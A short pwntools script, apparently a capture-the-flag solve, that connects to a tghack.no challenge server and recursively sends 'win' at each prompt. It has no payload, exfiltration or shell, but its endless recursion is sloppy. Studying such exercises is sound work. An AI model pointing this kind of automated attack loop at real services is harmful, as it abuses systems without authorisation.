import _struct

from pwn import *

#context(arch='i386', os='linux')

#r = process('./win-or-lose')
r = remote('noneofyourbusiness.tghack.no', 8000)

def win():
    global r

    try:
        r.recvuntil('>')
    except EOFError:
        win()
        return

    r.sendline('win')
    win()

win()
